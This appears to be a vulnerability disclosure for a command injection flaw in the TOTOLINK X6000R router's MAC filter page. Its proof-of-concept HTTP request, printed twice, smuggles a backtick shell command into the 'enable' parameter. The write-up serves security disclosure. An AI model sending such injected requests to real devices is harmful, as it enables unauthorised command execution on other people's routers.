# Summary
There is a command execution vulnerability in TOTOLINK X6000R(https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/247/ids/36.html).

Affected component is "/advance/macf.html".

# Details
Web front-end interface:
![image](https://github.com/user-attachments/assets/f9ccab3a-c2ce-4538-9cda-8239e1243429)


Capture the packet and see the enable parameter, and do a blind test directly:
```HTTP
POST /cgi-bin/cstecgi.cgi?token=BB19D84941E95CCC HTTP/1.1
Host: ip:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 72
Origin: http://ip:8081
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://ip:8081/advance/macf.html?token=BB19D84941E95CCC
Priority: u=1

{"mode":"1","addEffect":"0","enable":"`ls >/web/poc_macf.txt`","topicurl":"setMacFilterRules"}
```
![image](https://github.com/user-attachments/assets/682bf61b-55b1-47fd-aab2-b73f4b15ebac)

![image](https://github.com/user-attachments/assets/b4c8f847-8dd0-4b1b-b562-6b88ed81dd86)



# PoC
Capture the packet and see the enable parameter, and do a blind test directly:
```HTTP
POST /cgi-bin/cstecgi.cgi?token=BB19D84941E95CCC HTTP/1.1
Host: ip:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 72
Origin: http://ip:8081
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://ip:8081/advance/macf.html?token=BB19D84941E95CCC
Priority: u=1

{"mode":"1","addEffect":"0","enable":"`ls >/web/poc_macf.txt`","topicurl":"setMacFilterRules"}
```
![image](https://github.com/user-attachments/assets/682bf61b-55b1-47fd-aab2-b73f4b15ebac)

![image](https://github.com/user-attachments/assets/b4c8f847-8dd0-4b1b-b562-6b88ed81dd86)
